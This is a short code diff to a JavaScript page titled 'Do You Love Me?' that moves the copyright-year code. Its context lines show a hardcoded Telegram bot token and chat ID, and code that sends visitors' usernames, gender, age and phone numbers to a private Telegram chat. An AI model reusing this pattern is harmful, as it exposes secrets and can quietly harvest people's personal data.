@@ -49,9 +49,7 @@
           "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
         const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
         const message = `Informations: User \nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
-        // Automatically update the copyright year
-        const currentYear = new Date().getFullYear();
-        const copyrightElement = document.getElementById("copyright");
+       
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
           method: "POST",
           headers: {
@@ -100,7 +98,9 @@
           console.error("Message element not found!");
         }
       }
-       
+        // Automatically update the copyright year
+        const currentYear = new Date().getFullYear();
+        const copyrightElement = document.getElementById("copyright");
       if (copyrightElement) {
         copyrightElement.textContent = `© ${currentYear} Do You Love Me? All rights reserved.`;
       }
